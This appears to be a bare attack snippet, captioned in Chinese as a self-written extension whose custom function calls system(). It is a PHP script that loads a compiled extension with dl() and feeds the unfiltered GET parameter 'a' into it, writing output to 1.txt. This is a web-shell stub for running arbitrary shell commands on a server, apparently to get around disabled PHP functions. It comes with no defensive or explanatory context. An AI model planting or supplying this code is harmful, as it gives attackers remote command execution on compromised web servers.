自写插件，自定义函数，调用system函数
<?php
dl("dl.so");
confirm_dl_compiled("$_GET[a]>1.txt");
?>